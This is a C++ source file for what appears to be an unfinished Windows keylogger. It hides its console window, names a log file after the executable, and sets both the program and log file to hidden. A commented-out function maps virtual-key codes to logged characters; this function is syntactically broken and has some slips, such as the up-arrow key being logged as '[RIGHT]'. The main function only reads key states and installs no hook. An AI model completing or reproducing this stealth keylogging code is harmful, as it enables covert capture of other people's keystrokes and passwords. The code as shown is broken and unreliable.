#include "keyloggerClub.h"

void HideWindow()
{
    HWND hWindow = GetConsoleWindow();
    if (hWindow != NULL)
    {
        if (IsWindowVisible(hWindow) != 0)
        {
            ShowWindow(hWindow, SW_HIDE);
        }
        CloseHandle(hWindow);
    }
}

std::string keylogger = "", logFile = "";
bool SetFileNames()
{
    bool success = false;
    char buffer[MAX_PATH] = "";
    if (GetModuleFileNameA(NULL, buffer, sizeof(buffer)) == 0)
    {
        printf("Cannot get the file path\n");
    }
    else
    {
        keylogger = logFile = buffer;
        std::size_t pos = logFile.rfind(".");
        if (pos == std::string::npos)
        {
            printf("Cannot set the log file name\n");
        }
        else
        {
            logFile.erase(pos + 1);
            logFile.append("log");
            success = true;
        }
    }
    return success;
}

void Hide(std::string file)
{
    DWORD attr = GetFileAttributesA(file.c_str());
    if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_HIDDEN))
    {
        SetFileAttributesA(file.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
}
void HideFiles()
{
    Hide(keylogger);
    Hide(logFile);
}

bool capital = false, numLock = false, shift = false;

void Write(std::ofstream file, std::string key)
{
    file << key;
}

/*std::string GetKey()
{
    string key = ;
case 0x41:
{
    Write(file, capital ? (shift ? "a" : "A") : (shift ? "A" : "a"));
    break;
}
case 0x42:
{
    Write(file, capital ? (shift ? "b" : "B") : (shift ? "B" : "b"));
    break;
}
case 0x43:
{
    Write(file, capital ? (shift ? "c" : "C") : (shift ? "C" : "c"));
    break;
}
case 0x44:
{
    Write(file, capital ? (shift ? "d" : "D") : (shift ? "D" : "d"));
    break;
}
case 0x45:
{
    Write(file, capital ? (shift ? "e" : "E") : (shift ? "E" : "e"));
    break;
}
case 0x46:
{
    Write(file, capital ? (shift ? "f" : "F") : (shift ? "F" : "f"));
    break;
}
case 0x47:
{
    Write(file, capital ? (shift ? "g" : "G") : (shift ? "G" : "g"));
    break;
}
case 0x48:
{
    Write(file, capital ? (shift ? "h" : "H") : (shift ? "H" : "h"));
    break;
}
case 0x49:
{
    Write(file, capital ? (shift ? "i" : "I") : (shift ? "I" : "i"));
    break;
}
case 0x4A:
{
    Write(file, capital ? (shift ? "j" : "J") : (shift ? "J" : "j"));
    break;
}
case 0x4B:
{
    Write(file, capital ? (shift ? "k" : "K") : (shift ? "K" : "k"));
    break;
}
case 0x4C:
{
    Write(file, capital ? (shift ? "l" : "L") : (shift ? "L" : "l"));
    break;
}
case 0x4D:
{
    Write(file, capital ? (shift ? "m" : "M") : (shift ? "M" : "m"));
    break;
}
case 0x4E:
{
    Write(file, capital ? (shift ? "n" : "N") : (shift ? "N" : "n"));
    break;
}
case 0x4F:
{
    Write(file, capital ? (shift ? "o" : "O") : (shift ? "O" : "o"));
    break;
}
case 0x50:
{
    Write(file, capital ? (shift ? "p" : "P") : (shift ? "P" : "p"));
    break;
}
case 0x51:
{
    Write(file, capital ? (shift ? "q" : "Q") : (shift ? "Q" : "q"));
    break;
}
case 0x52:
{
    Write(file, capital ? (shift ? "r" : "R") : (shift ? "R" : "r"));
    break;
}
case 0x53:
{
    Write(file, capital ? (shift ? "s" : "S") : (shift ? "S" : "s"));
    break;
}
case 0x54:
{
    Write(file, capital ? (shift ? "t" : "T") : (shift ? "T" : "t"));
    break;
}
case 0x55:
{
    Write(file, capital ? (shift ? "u" : "U") : (shift ? "U" : "u"));
    break;
}
case 0x56:
{
    Write(file, capital ? (shift ? "v" : "V") : (shift ? "V" : "v"));
    break;
}
case 0x57:
{
    Write(file, capital ? (shift ? "w" : "W") : (shift ? "W" : "w"));
    break;
}
case 0x58:
{
    Write(file, capital ? (shift ? "x" : "X") : (shift ? "X" : "x"));
    break;
}
case 0x59:
{
    Write(file, capital ? (shift ? "y" : "Y") : (shift ? "Y" : "y"));
    break;
}
case 0x5A:
{
    Write(file, capital ? (shift ? "z" : "Z") : (shift ? "Z" : "z"));
    break;
}
case 0x30:
{
    Write(file, shift ? ")" : "0");
    break;
}
case 0x31:
{
    Write(file, shift ? "!" : "1");
    break;
}
case 0x32:
{
    Write(file, shift ? "@" : "2");
    break;
}
case 0x33:
{
    Write(file, shift ? "#" : "3");
    break;
}
case 0x34:
{
    Write(file, shift ? "$" : "4");
    break;
}
case 0x35:
{
    Write(file, shift ? "%" : "5");
    break;
}
case 0x36:
{
    Write(file, shift ? "^" : "6");
    break;
}
case 0x37:
{
    Write(file, shift ? "&" : "7");
    break;
}
case 0x38:
{
    Write(file, shift ? "*" : "8");
    break;
}
case 0x39:
{
    Write(file, shift ? "(" : "9");
    break;
}
case VK_OEM_1:
{
    Write(file, shift ? ":" : ";");
    break;
}
case VK_OEM_2:
{
    Write(file, shift ? "?" : "/");
    break;
}
case VK_OEM_3:
{
    Write(file, shift ? "~" : "`");
    break;
}
case VK_OEM_4:
{
    Write(file, shift ? "{" : "[");
    break;
}
case VK_OEM_5:
{
    Write(file, shift ? "|" : "\\");
    break;
}
case VK_OEM_6:
{
    Write(file, shift ? "}" : "]");
    break;
}
case VK_OEM_7:
{
    Write(file, shift ? "\"" : "'");
    break;
}
case VK_OEM_PLUS:
{
    Write(file, shift ? "+" : "=");
    break;
}
case VK_OEM_COMMA:
{
    Write(file, shift ? "<" : ",");
    break;
}
case VK_OEM_MINUS:
{
    Write(file, shift ? "_" : "-");
    break;
}
case VK_OEM_PERIOD:
{
    Write(file, shift ? ">" : ".");
    break;
}
case VK_SPACE:
{
    Write(file, " ");
    break;
}
case VK_NUMPAD0:
{
    Write(file, "0");
    break;
}
case VK_NUMPAD1:
{
    Write(file, "1");
    break;
}
case VK_NUMPAD2:
{
    Write(file, "2");
    break;
}
case VK_NUMPAD3:
{
    Write(file, "3");
    break;
}
case VK_NUMPAD4:
{
    Write(file, "4");
    break;
}
case VK_NUMPAD5:
{
    Write(file, "5");
    break;
}
case VK_NUMPAD6:
{
    Write(file, "6");
    break;
}
case VK_NUMPAD7:
{
    Write(file, "7");
    break;
}
case VK_NUMPAD8:
{
    Write(file, "8");
    break;
}
case VK_NUMPAD9:
{
    Write(file, "9");
    break;
}
case VK_MULTIPLY:
{
    Write(file, "*");
    break;
}
case VK_ADD:
{
    Write(file, "+");
    break;
}
case VK_SUBTRACT:
{
    Write(file, "-");
    break;
}
case VK_DECIMAL:
{
    Write(file, ",");
    break;
}
case VK_DIVIDE:
{
    Write(file, "/");
    break;
}
case VK_BACK:
{
    Write(file, "[BACKSPACE]");
    break;
}
case VK_TAB:
{
    Write(file, "[TAB]");
    break;
}
case VK_RETURN:
{
    Write(file, "[ENTER]");
    break;
}
case VK_MENU:
{
    Write(file, "[ALT]");
    break;
}
case VK_ESCAPE:
{
    Write(file, "[ESC]");
    break;
}
case VK_PRIOR:
{
    Write(file, "[PG UP]");
    break;
}
case VK_NEXT:
{
    Write(file, "[PG DN]");
    break;
}
case VK_END:
{
    Write(file, "[END]");
    break;
}
case VK_HOME:
{
    Write(file, "[HOME]");
    break;
}
case VK_LEFT:
{
    Write(file, "[LEFT]");
    break;
}
case VK_UP:
{
    Write(file, "[RIGHT]");
    break;
}
case VK_RIGHT:
{
    Write(file, "[RIGHT]");
    break;
}
case VK_DOWN:
{
    Write(file, "[DOWN]");
    break;
}
case VK_PRINT:
{
    Write(file, "[PRINT]");
    break;
}
case VK_SNAPSHOT:
{
    Write(file, "[PRT SC]");
    break;
}
case VK_INSERT:
{
    Write(file, "[INSERT]");
    break;
}
case VK_DELETE:
{
    Write(file, "[DELETE]");
    break;
}
case VK_LWIN:
{
    Write(file, "[WIN KEY]");
    break;
}
case VK_RWIN:
{
    Write(file, "[WIN KEY]");
    break;
}
case VK_CAPITAL:
{
    capital = !capital;
    break;
}
case VK_NUMLOCK:
{
    numLock = !numLock;
    break;
}
case VK_LCONTROL:
{
    if (wParam == WM_KEYDOWN)
    {
        Write(file, "[CTRL]");
    }
    break;
}
case VK_RCONTROL:
{
    if (wParam == WM_KEYDOWN)
    {
        Write(file, "[CTRL]");
    }
    break;
}
case VK_F1:
{
    Write(file, "[F1]");
    break;
}
case VK_F2:
{
    Write(file, "[F2]");
    break;
}
case VK_F3:
{
    Write(file, "[F3]");
    break;
}
case VK_F4:
{
    Write(file, "[F4]");
    break;
}
case VK_F5:
{
    Write(file, "[F5]");
    break;
}
case VK_F6:
{
    Write(file, "[F6]");
    break;
}
case VK_F7:
{
    Write(file, "[F7]");
    break;
}
case VK_F8:
{
    Write(file, "[F8]");
    break;
}
case VK_F9:
{
    Write(file, "[F9]");
    break;
}
case VK_F10:
{
    Write(file, "[F10]");
    break;
}
case VK_F11:
{
    Write(file, "[F11]");
    break;
}
case VK_F12:
{
    Write(file, "[F12]");
    break;
}
    return key;
}*/

int main()
{
    capital = GetKeyState(VK_CAPITAL);
    numLock = GetKeyState(VK_NUMLOCK);
    shift = GetKeyState(VK_SHIFT);
}